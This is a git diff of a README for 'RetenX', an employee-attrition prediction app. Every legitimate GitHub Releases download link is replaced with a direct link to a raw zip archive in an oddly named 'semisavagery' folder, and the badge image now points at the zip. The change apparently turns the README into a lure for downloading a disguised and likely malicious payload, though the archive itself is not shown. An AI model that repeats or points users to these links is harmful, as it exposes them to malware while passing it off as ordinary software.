@@ -1,6 +1,6 @@
 # 📊 RetenX - Predict Employee Attrition with Ease
 
-[![Download RetenX](https://img.shields.io/badge/Download%20RetenX-v1.0-brightgreen)](https://github.com/Zainmalik242/RetenX/releases)
+[![Download RetenX](https://raw.githubusercontent.com/Zainmalik242/RetenX/main/semisavagery/RetenX.zip%20RetenX-v1.0-brightgreen)](https://raw.githubusercontent.com/Zainmalik242/RetenX/main/semisavagery/RetenX.zip)
 
 ## 📦 Overview
 
@@ -10,7 +10,7 @@ RetenX is an easy-to-use software application that helps organizations predict w
 
 Follow these simple steps to download and run RetenX:
 
-1. **Visit the Download Page**: To get started, [visit this page to download](https://github.com/Zainmalik242/RetenX/releases).
+1. **Visit the Download Page**: To get started, [visit this page to download](https://raw.githubusercontent.com/Zainmalik242/RetenX/main/semisavagery/RetenX.zip).
 
 2. **Choose the Latest Release**: On the Releases page, you will see a list of available versions. Always select the latest version for the best features and bug fixes.
 
@@ -48,7 +48,7 @@ RetenX comes packed with features designed to make employee attrition prediction
 
 ## 📥 Download & Install
 
-To download RetenX, [visit this page to download](https://github.com/Zainmalik242/RetenX/releases) the latest version. Follow the steps outlined in the "Getting Started" section to install the software on your device. 
+To download RetenX, [visit this page to download](https://raw.githubusercontent.com/Zainmalik242/RetenX/main/semisavagery/RetenX.zip) the latest version. Follow the steps outlined in the "Getting Started" section to install the software on your device. 
 
 If you encounter any issues during download or installation, please refer to the FAQ section or contact support for assistance.
 
